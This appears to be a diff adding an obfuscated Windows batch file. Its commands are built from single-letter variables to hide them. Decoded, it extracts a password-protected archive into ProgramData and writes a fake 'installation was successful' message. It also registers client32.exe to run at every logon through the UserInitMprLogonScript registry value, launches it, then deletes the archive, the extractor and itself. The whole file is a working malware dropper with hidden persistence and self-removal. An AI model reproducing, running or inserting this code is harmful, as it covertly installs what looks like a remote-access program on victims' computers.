@@ -1,0 +1,73 @@
+@echo off
+@chcp 1251
+set dltpamgqdcXvXvX=c
+set fkknkskjqjXvXvX=R
+set xkvioggnhaXvXvX=k
+set ztqaprhfdgXvXvX=V
+set venpnkfmskXvXvX=m
+set zqosobjskhXvXvX=e
+set kcjzzfajhkXvXvX=I
+set ftqfsivfhvXvXvX=W
+set vhjgjvyvwnXvXvX=o
+set nzpiuqnppfXvXvX=Z
+set vafljksjhzXvXvX=G
+set zhjwejygppXvXvX=J
+set dkgjdfntngXvXvX=U
+set jftgcozzcpXvXvX=Y
+set pejajwqiffXvXvX=g
+set ivismnzvnoXvXvX=E
+set eejdhaacxgXvXvX=S
+set czzyfhrwhvXvXvX=v
+set suyfjqgajhXvXvX=a
+set xgxdxqavieXvXvX=p
+set fpwjhnpptjXvXvX=T
+set ehschesznaXvXvX=F
+set agquyfuaufXvXvX=l
+set cvrwbchrsjXvXvX=X
+set cjdghpyhbjXvXvX=b
+set kldjfjsqpdXvXvX=Q
+set jygabrjhcyXvXvX=z
+set yksanbcfasXvXvX=n
+set zaqwgffggpXvXvX=D
+set ebddhwgwapXvXvX=A
+set dpepwqucghXvXvX=M
+set ewnnrnsntuXvXvX=H
+set uehjhfvjhfXvXvX=x
+set uxxuqqksskXvXvX=d
+set gggibjshxxXvXvX=s
+set rjfkgkrrkwXvXvX=C
+set vvkkkaaiejXvXvX=w
+set sppbbmdjhdXvXvX=B
+set uyhhhakakaXvXvX=q
+set kadfjeiiifXvXvX=j
+set zzyjgjaautXvXvX=O
+set qqudvhbnejXvXvX=y
+set dpgdofjwndXvXvX=h
+set nvjsjhwqhaXvXvX=t
+set dgiaetdkhgXvXvX=f
+set jgwjhbajhvXvXvX=u
+set vbgiogjsbgXvXvX=i
+set hxyegahajvXvXvX=P
+set hehshgjgjsXvXvX=K
+set bhhhpfpdkdXvXvX=r
+set kaagkkkfjeXvXvX=L
+set hcffffrhsgXvXvX=N
+if exist "%ProgramData%\%kaagkkkfjeXvXvX%%vhjgjvyvwnXvXvX%%pejajwqiffXvXvX%.%cjdghpyhbjXvXvX%%vbgiogjsbgXvXvX%%yksanbcfasXvXvX%" %pejajwqiffXvXvX%%vhjgjvyvwnXvXvX%%nvjsjhwqhaXvXvX%%vhjgjvyvwnXvXvX% %pejajwqiffXvXvX%%vhjgjvyvwnXvXvX%
+%zqosobjskhXvXvX%%dltpamgqdcXvXvX%%dpgdofjwndXvXvX%%vhjgjvyvwnXvXvX% %fpwjhnpptjXvXvX%%dpgdofjwndXvXvX%%zqosobjskhXvXvX% %vbgiogjsbgXvXvX%%yksanbcfasXvXvX%%gggibjshxxXvXvX%%nvjsjhwqhaXvXvX%%suyfjqgajhXvXvX%%agquyfuaufXvXvX%%agquyfuaufXvXvX%%suyfjqgajhXvXvX%%nvjsjhwqhaXvXvX%%vbgiogjsbgXvXvX%%vhjgjvyvwnXvXvX%%yksanbcfasXvXvX% %vvkkkaaiejXvXvX%%suyfjqgajhXvXvX%%gggibjshxxXvXvX% %gggibjshxxXvXvX%%jgwjhbajhvXvXvX%%dltpamgqdcXvXvX%%dltpamgqdcXvXvX%%zqosobjskhXvXvX%%gggibjshxxXvXvX%%gggibjshxxXvXvX%%dgiaetdkhgXvXvX%%jgwjhbajhvXvXvX%%agquyfuaufXvXvX% >"%ProgramData%\%kaagkkkfjeXvXvX%%vhjgjvyvwnXvXvX%%pejajwqiffXvXvX%.%cjdghpyhbjXvXvX%%vbgiogjsbgXvXvX%%yksanbcfasXvXvX%"
+%nvjsjhwqhaXvXvX%%suyfjqgajhXvXvX%%gggibjshxxXvXvX%%xkvioggnhaXvXvX%%xkvioggnhaXvXvX%%vbgiogjsbgXvXvX%%agquyfuaufXvXvX%%agquyfuaufXvXvX% /%kcjzzfajhkXvXvX%%dpepwqucghXvXvX% %dltpamgqdcXvXvX%%agquyfuaufXvXvX%%vbgiogjsbgXvXvX%%zqosobjskhXvXvX%%yksanbcfasXvXvX%%nvjsjhwqhaXvXvX%32.%zqosobjskhXvXvX%%uehjhfvjhfXvXvX%%zqosobjskhXvXvX% /%ehschesznaXvXvX%
+%xgxdxqavieXvXvX%%vbgiogjsbgXvXvX%%yksanbcfasXvXvX%%pejajwqiffXvXvX% -%yksanbcfasXvXvX% 1 127.0.0.1 > %yksanbcfasXvXvX%%jgwjhbajhvXvXvX%%agquyfuaufXvXvX%
+"%ProgramData%\%rjfkgkrrkwXvXvX%%bhhhpfpdkdXvXvX%%zqosobjskhXvXvX%%suyfjqgajhXvXvX%%nvjsjhwqhaXvXvX%%vhjgjvyvwnXvXvX%%bhhhpfpdkdXvXvX%.%zqosobjskhXvXvX%%uehjhfvjhfXvXvX%%zqosobjskhXvXvX%" %uehjhfvjhfXvXvX% -%xgxdxqavieXvXvX%%ehschesznaXvXvX%%ewnnrnsntuXvXvX%%dgiaetdkhgXvXvX%%gggibjshxxXvXvX%%ehschesznaXvXvX%%kadfjeiiifXvXvX%%dgiaetdkhgXvXvX%%gggibjshxxXvXvX%%zqosobjskhXvXvX%%vafljksjhzXvXvX%%qqudvhbnejXvXvX%%kadfjeiiifXvXvX%%pejajwqiffXvXvX%%eejdhaacxgXvXvX%%uxxuqqksskXvXvX%%dgiaetdkhgXvXvX%%vhjgjvyvwnXvXvX%%xgxdxqavieXvXvX%%uxxuqqksskXvXvX%%eejdhaacxgXvXvX%%dgiaetdkhgXvXvX%%bhhhpfpdkdXvXvX%%suyfjqgajhXvXvX% -%qqudvhbnejXvXvX% "%ProgramData%\%dpepwqucghXvXvX%%vhjgjvyvwnXvXvX%%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%venpnkfmskXvXvX%%kaagkkkfjeXvXvX%%vhjgjvyvwnXvXvX%%pejajwqiffXvXvX%%gggibjshxxXvXvX%.%cjdghpyhbjXvXvX%%vbgiogjsbgXvXvX%%yksanbcfasXvXvX%" -%vhjgjvyvwnXvXvX%"%ProgramData%"
+%bhhhpfpdkdXvXvX%%zqosobjskhXvXvX%%pejajwqiffXvXvX% %suyfjqgajhXvXvX%%uxxuqqksskXvXvX%%uxxuqqksskXvXvX% "%ewnnrnsntuXvXvX%%hehshgjgjsXvXvX%%ivismnzvnoXvXvX%%jftgcozzcpXvXvX%_%rjfkgkrrkwXvXvX%%dkgjdfntngXvXvX%%fkknkskjqjXvXvX%%fkknkskjqjXvXvX%%ivismnzvnoXvXvX%%hcffffrhsgXvXvX%%fpwjhnpptjXvXvX%_%dkgjdfntngXvXvX%%eejdhaacxgXvXvX%%ivismnzvnoXvXvX%%fkknkskjqjXvXvX%\%ivismnzvnoXvXvX%%yksanbcfasXvXvX%%czzyfhrwhvXvXvX%%vbgiogjsbgXvXvX%%bhhhpfpdkdXvXvX%%vhjgjvyvwnXvXvX%%yksanbcfasXvXvX%%venpnkfmskXvXvX%%zqosobjskhXvXvX%%yksanbcfasXvXvX%%nvjsjhwqhaXvXvX%" /%czzyfhrwhvXvXvX% %dkgjdfntngXvXvX%%gggibjshxxXvXvX%%zqosobjskhXvXvX%%bhhhpfpdkdXvXvX%%kcjzzfajhkXvXvX%%yksanbcfasXvXvX%%vbgiogjsbgXvXvX%%nvjsjhwqhaXvXvX%%dpepwqucghXvXvX%%xgxdxqavieXvXvX%%bhhhpfpdkdXvXvX%%kaagkkkfjeXvXvX%%vhjgjvyvwnXvXvX%%pejajwqiffXvXvX%%vhjgjvyvwnXvXvX%%yksanbcfasXvXvX%%eejdhaacxgXvXvX%%dltpamgqdcXvXvX%%bhhhpfpdkdXvXvX%%vbgiogjsbgXvXvX%%xgxdxqavieXvXvX%%nvjsjhwqhaXvXvX% /%nvjsjhwqhaXvXvX% %fkknkskjqjXvXvX%%ivismnzvnoXvXvX%%vafljksjhzXvXvX%_%ivismnzvnoXvXvX%%cvrwbchrsjXvXvX%%hxyegahajvXvXvX%%ebddhwgwapXvXvX%%hcffffrhsgXvXvX%%zaqwgffggpXvXvX%_%eejdhaacxgXvXvX%%nzpiuqnppfXvXvX% /%uxxuqqksskXvXvX% "%ProgramData%\%dpepwqucghXvXvX%%vhjgjvyvwnXvXvX%%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%venpnkfmskXvXvX%%kaagkkkfjeXvXvX%%vhjgjvyvwnXvXvX%%pejajwqiffXvXvX%%gggibjshxxXvXvX%\%dltpamgqdcXvXvX%%agquyfuaufXvXvX%%vbgiogjsbgXvXvX%%zqosobjskhXvXvX%%yksanbcfasXvXvX%%nvjsjhwqhaXvXvX%32.%zqosobjskhXvXvX%%uehjhfvjhfXvXvX%%zqosobjskhXvXvX%" /%dgiaetdkhgXvXvX%
+%xgxdxqavieXvXvX%%vbgiogjsbgXvXvX%%yksanbcfasXvXvX%%pejajwqiffXvXvX% -%yksanbcfasXvXvX% 10 127.0.0.1 > %yksanbcfasXvXvX%%jgwjhbajhvXvXvX%%agquyfuaufXvXvX%
+%gggibjshxxXvXvX%%nvjsjhwqhaXvXvX%%suyfjqgajhXvXvX%%bhhhpfpdkdXvXvX%%nvjsjhwqhaXvXvX% "%dltpamgqdcXvXvX%%agquyfuaufXvXvX%%vbgiogjsbgXvXvX%%zqosobjskhXvXvX%%yksanbcfasXvXvX%%nvjsjhwqhaXvXvX%32.%zqosobjskhXvXvX%%uehjhfvjhfXvXvX%%zqosobjskhXvXvX%" "%ProgramData%\%dpepwqucghXvXvX%%vhjgjvyvwnXvXvX%%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%venpnkfmskXvXvX%%kaagkkkfjeXvXvX%%vhjgjvyvwnXvXvX%%pejajwqiffXvXvX%%gggibjshxxXvXvX%\%dltpamgqdcXvXvX%%agquyfuaufXvXvX%%vbgiogjsbgXvXvX%%zqosobjskhXvXvX%%yksanbcfasXvXvX%%nvjsjhwqhaXvXvX%32.%zqosobjskhXvXvX%%uehjhfvjhfXvXvX%%zqosobjskhXvXvX%"
+%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%agquyfuaufXvXvX% /%dgiaetdkhgXvXvX% /%uyhhhakakaXvXvX% "%ProgramData%\%dpepwqucghXvXvX%%vhjgjvyvwnXvXvX%%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%venpnkfmskXvXvX%%kaagkkkfjeXvXvX%%vhjgjvyvwnXvXvX%%pejajwqiffXvXvX%%gggibjshxxXvXvX%.%cjdghpyhbjXvXvX%%vbgiogjsbgXvXvX%%yksanbcfasXvXvX%"
+%nvjsjhwqhaXvXvX%%suyfjqgajhXvXvX%%gggibjshxxXvXvX%%xkvioggnhaXvXvX%%xkvioggnhaXvXvX%%vbgiogjsbgXvXvX%%agquyfuaufXvXvX%%agquyfuaufXvXvX% /%kcjzzfajhkXvXvX%%dpepwqucghXvXvX% %bhhhpfpdkdXvXvX%%jgwjhbajhvXvXvX%%yksanbcfasXvXvX%%uxxuqqksskXvXvX%%agquyfuaufXvXvX%%agquyfuaufXvXvX%32.%zqosobjskhXvXvX%%uehjhfvjhfXvXvX%%zqosobjskhXvXvX% /%ehschesznaXvXvX%
+%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%agquyfuaufXvXvX% /%dgiaetdkhgXvXvX% /%uyhhhakakaXvXvX% "%ProgramData%\%rjfkgkrrkwXvXvX%%bhhhpfpdkdXvXvX%%zqosobjskhXvXvX%%suyfjqgajhXvXvX%%nvjsjhwqhaXvXvX%%vhjgjvyvwnXvXvX%%bhhhpfpdkdXvXvX%.%zqosobjskhXvXvX%%uehjhfvjhfXvXvX%%zqosobjskhXvXvX%"
+%nvjsjhwqhaXvXvX%%suyfjqgajhXvXvX%%gggibjshxxXvXvX%%xkvioggnhaXvXvX%%xkvioggnhaXvXvX%%vbgiogjsbgXvXvX%%agquyfuaufXvXvX%%agquyfuaufXvXvX% /%kcjzzfajhkXvXvX%%dpepwqucghXvXvX% %bhhhpfpdkdXvXvX%%jgwjhbajhvXvXvX%%yksanbcfasXvXvX%%uxxuqqksskXvXvX%%agquyfuaufXvXvX%%agquyfuaufXvXvX%32.%zqosobjskhXvXvX%%uehjhfvjhfXvXvX%%zqosobjskhXvXvX% /%ehschesznaXvXvX%
+%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%agquyfuaufXvXvX% %0
+Exit
+:go
+%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%agquyfuaufXvXvX% /%dgiaetdkhgXvXvX% /%uyhhhakakaXvXvX% "%ProgramData%\%dpepwqucghXvXvX%%vhjgjvyvwnXvXvX%%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%venpnkfmskXvXvX%%kaagkkkfjeXvXvX%%vhjgjvyvwnXvXvX%%pejajwqiffXvXvX%%gggibjshxxXvXvX%.%cjdghpyhbjXvXvX%%vbgiogjsbgXvXvX%%yksanbcfasXvXvX%"
+%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%agquyfuaufXvXvX% /%dgiaetdkhgXvXvX% /%uyhhhakakaXvXvX% "%ProgramData%\%rjfkgkrrkwXvXvX%%bhhhpfpdkdXvXvX%%zqosobjskhXvXvX%%suyfjqgajhXvXvX%%nvjsjhwqhaXvXvX%%vhjgjvyvwnXvXvX%%bhhhpfpdkdXvXvX%.%zqosobjskhXvXvX%%uehjhfvjhfXvXvX%%zqosobjskhXvXvX%"
+%uxxuqqksskXvXvX%%zqosobjskhXvXvX%%agquyfuaufXvXvX% %0
+Exit
